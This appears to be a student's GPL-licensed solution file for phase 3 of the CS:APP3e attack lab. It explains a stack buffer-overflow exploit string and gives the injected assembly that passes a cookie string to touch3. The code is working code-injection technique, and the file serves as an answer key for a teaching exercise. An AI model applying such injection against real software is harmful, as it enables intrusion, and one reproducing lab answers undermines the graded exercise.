# A solution for the phase 3 of attack bomb in CS:APP3e
#
# Copyright (C) 2022 Tongjie Liu <tongjieandliu@gmail.com>.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

#	As we described in phase 2, there are some SSE instructions in
# ctarget, and these insturctions need data alignment of 16 bytes. Then,
# the address of function touch3 should be placed on addresses A + 16k,
# k = ..., -2, -1, 0, 1, 2, ..., and A is where the return address of
# somewhere from function test in the stack frame of function getbuf,
# which is also where the address of injected code should be placed.
#
#	Since A + 16 * 0 = A is taken up by the address of injected code
# and we don't want to further corrupt the stack, A - 16 is a pretty good
# place to place the address of function touch3.
#
#	Its address is obtained by the following commands:
#	$ gdb ctarget
#	(gdb) print touch3
#	$1 = {void (char *)} 0x4018fa <touch3>
# 
#	If we don't want our string argument passed to touch3 being corrupted
# by some function calls, we could put it at address A - 8. The reason is that
# all functions only write data into their own stack frames.
#
#	Our cookie can be obtained by:
#	$ cat cookie.txt
#	0x59b997fa
# After looking up the manpage of ascii, we could convert this to characters
# in ascii as: 0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61.
#
#	Finally, the structure of exploit string is the following(from lower
# addresses to higher addresses):
#	1. injected code(this file)
#	2. zeros(or anything else you like)
#	3. address of touch3
#	4. string argument
#	5. address of injected code(address of local variable buf in function
# getbuf, which was obtained in phase 2)
#
#	When we first enter the injected code, %rsp = A + 8.
	subq	$24, %rsp		# 8 + 16 = 24
	leaq	0x8(%rsp), %rdi		# address of the string argument
	xor	%rax, %rax		# clear %rax
	movq	%rax, 0x10(%rsp)	# add a terminating null byte to string
	ret
